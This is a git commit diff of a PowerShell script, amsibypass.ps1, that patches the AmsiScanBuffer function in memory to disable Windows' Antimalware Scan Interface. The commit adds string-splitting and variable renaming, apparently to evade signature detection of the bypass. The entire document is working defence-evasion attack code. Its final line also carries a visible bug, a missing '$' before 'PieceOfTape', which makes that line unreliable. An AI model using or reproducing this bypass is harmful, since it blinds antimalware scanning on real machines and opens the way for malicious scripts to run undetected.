4dcdf1d487569d0f071e5a64ee572e00b420d656
drscript0x0 <39132806+drscript0x0@users.noreply.github.com>
2021-05-03 21:33:23 -0500

    Update amsibypass.ps1

--- amsibypass.ps1
+++ amsibypass.ps1
@@ -1,4 +1,4 @@
-$Win32 = @"
+$Doors23 = @"
 
 using System;
 using System.Runtime.InteropServices;
@@ -17,11 +17,14 @@ public class Win32 {
 }
 "@
 
-Add-Type $Win32
+Add-Type $Doors23
 
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
-$p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+$libToLoad = "a" + "m" + "si" + ".dll"
+$asb = "A" + "m" + "s" + "i" + "Sc" + "an" + "B" + "u" + "ff" + "er"
+
+$LoadLibrary = [Win32]::LoadLibrary($libToLoad)
+$sserddA = [Win32]::GetProcAddress($LoadLibrary, $asb)
+$qqq = 0
+[Win32]::VirtualProtect($sserddA, [uint32]5, 0x40, [ref]$qqq)
+$PieceOfTape = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy(PieceOfTape, 0, $sserddA, 6)
